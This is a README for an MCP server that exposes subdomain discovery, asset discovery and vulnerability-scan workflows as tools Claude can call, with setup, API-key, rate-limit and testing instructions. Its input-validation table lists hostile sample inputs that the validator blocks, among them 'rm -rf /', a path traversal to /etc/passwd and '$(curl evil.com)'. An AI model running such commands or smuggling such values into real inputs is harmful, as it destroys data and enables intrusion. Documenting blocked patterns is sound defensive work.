# Orchestrator

The MCP server at the heart of Security Orchestra. It exposes security automation workflows as [Model Context Protocol](https://modelcontextprotocol.io) tools that Claude (or any MCP client) can invoke. Every request passes through a layered security pipeline before any workflow runs.

---

## How It Works

The orchestrator runs as a **stdio MCP server** — Claude Desktop spawns it as a subprocess and communicates via JSON over stdin/stdout. All server logs go to stderr so they don't interfere with the protocol.

### Request pipeline

Every `execute_workflow` call goes through these steps in order:

```
1. Auth check        Verify the API key set at startup
2. Rate limit        Sliding-window check against the user's tier limits
3. Input validation  Sanitize inputs, block injection patterns
4. Credit gate       Confirm sufficient balance via the billing API
5. Execution         Run the workflow against the (validated) target
6. Credit deduction  Deduct cost from balance after success
7. Audit log         Record the outcome to the shared audit database
```

If any step fails, the pipeline stops immediately and the error is returned to the client. Credits are **never** deducted for failed or blocked requests.

---

## Prerequisites

- **Node.js 18+** (built-in `fetch` is required; no polyfill needed)
- **npm 9+**
- The **billing-api** running at `http://localhost:3001` (or set `BILLING_API_URL` — leave it unset to skip credit checks entirely during development)

---

## Installation

```bash
cd orchestrator
npm install
npm run build
```

---

## Environment Setup

```bash
cp .env.example .env
```

Open `.env` and fill in the values. At minimum you need `ORCHESTRATOR_API_KEY`:

```dotenv
ORCHESTRATOR_API_KEY=sk_live_your_key_here
BILLING_API_URL=http://localhost:3001
AUDIT_DB_PATH=../audit.db
DATABASE_PATH=./keys.db
LOG_LEVEL=info
```

See [`.env.example`](.env.example) for full descriptions of every variable.

---

## Generating an API Key

API keys are bcrypt-hashed before storage — the plaintext is shown **once** and never saved. Run:

```bash
npm run generate-key <userId> <tier>
```

Example:

```bash
npm run generate-key alice pro

# ========================================
#   API Key Generated (shown only once!)
# ========================================
#   User  : alice
#   Tier  : pro
#   Key   : sk_live_3f8a2c1d...
# ========================================
# Store this key securely. It cannot be recovered.
```

Valid tiers: `free` · `starter` · `pro` · `enterprise`

Copy the key into your `.env` as `ORCHESTRATOR_API_KEY`, or pass it to Claude Desktop's config (see the root README).

---

## Running

```bash
# Build then start
npm run build && npm start
```

The server starts silently (all output is on stderr). It is ready when Claude Desktop's MCP handshake completes — you'll see this in stderr:

```
[orchestrator] [INFO] Auth OK — user: alice, tier: pro
[orchestrator] [INFO] Server ready — listening on stdio
```

To view logs while the server is running via Claude Desktop, check the Claude Desktop log directory or redirect stderr:

```bash
node dist/index.js 2>orchestrator.log
```

---

## Available Workflows

| Workflow | Description | Required param | Credit cost |
|---|---|---|---|
| `subdomain_discovery` | DNS brute-force + certificate transparency + passive sources | `domain` | **5** |
| `asset_discovery` | IP mapping, open ports, technology fingerprinting, cloud assets | `domain` | **15** |
| `vulnerability_assessment` | Vulnerability scan with prioritized findings and remediation | `target` (domain or IP) | **25** |

### Calling a workflow from Claude

```
Use the execute_workflow tool with:
  workflow: "subdomain_discovery"
  domain: "example.com"
```

Or to list all available workflows with your current credit balance:

```
Use the get_capabilities tool
```

---

## Rate Limits

Limits are enforced per-user using a **sliding window** algorithm across three window sizes.

| Tier | Per minute | Per hour | Per day |
|---|---|---|---|
| Free | 10 | 100 | 500 |
| Starter | 60 | 1,000 | 5,000 |
| Pro | 300 | 5,000 | 50,000 |
| Enterprise | 1,000 | 20,000 | 200,000 |

When a limit is hit the request is rejected with a `429` error before any I/O occurs. No credits are consumed.

---

## Input Validation

All workflow parameters are validated before execution. The following inputs are rejected:

| Pattern | Example |
|---|---|
| Shell metacharacters | `example.com; rm -rf /` |
| Path traversal | `../../../etc/passwd` |
| SQL keywords | `example.com OR 1=1` |
| Subshell injection | `$(curl evil.com)` |
| Template injection | `{{7*7}}.example.com` |
| Newline / control chars | `example.com\nX-Header: injected` |

---

## Testing

```bash
npm run build

# Input validation (25 tests — malicious inputs and valid inputs)
node dist/scripts/testValidation.js

# Rate limiting (26 tests — all windows, header values, user isolation)
node dist/scripts/testRateLimit.js

# Audit logging (full pipeline simulation + log table output)
node dist/scripts/testAudit.js
```

Expected output for all suites ends with:
```
── Results ────────────────────────────────────────────────────
   Passed: N  |  Failed: 0  |  Total: N
```

---

## Troubleshooting

### `API key validation failed`
The key in `ORCHESTRATOR_API_KEY` does not match any active key in `keys.db`. Regenerate with `npm run generate-key` and update `.env`.

### `Failed to open database`
`keys.db` cannot be created or opened. Check that the directory is writable, and that `DATABASE_PATH` in `.env` points to a valid location.

### Billing API errors in logs
`BILLING_API_URL` is set but the billing-api is not running. Either start billing-api (`cd billing-api && npm start`) or remove `BILLING_API_URL` from `.env` to disable credit checks.

### No tools visible in Claude Desktop
- Confirm the path in `claude_desktop_config.json` is the **absolute** compiled path (`dist/index.js`, not `src/index.ts`)
- Run `npm run build` after any source changes
- Check Claude Desktop's MCP logs for stderr output from the server

### `429: Rate limit exceeded`
You've hit your tier's request limit. The error message includes `Retry after Xs`. Upgrade your tier via the billing-api's `/checkout` endpoint for higher limits.
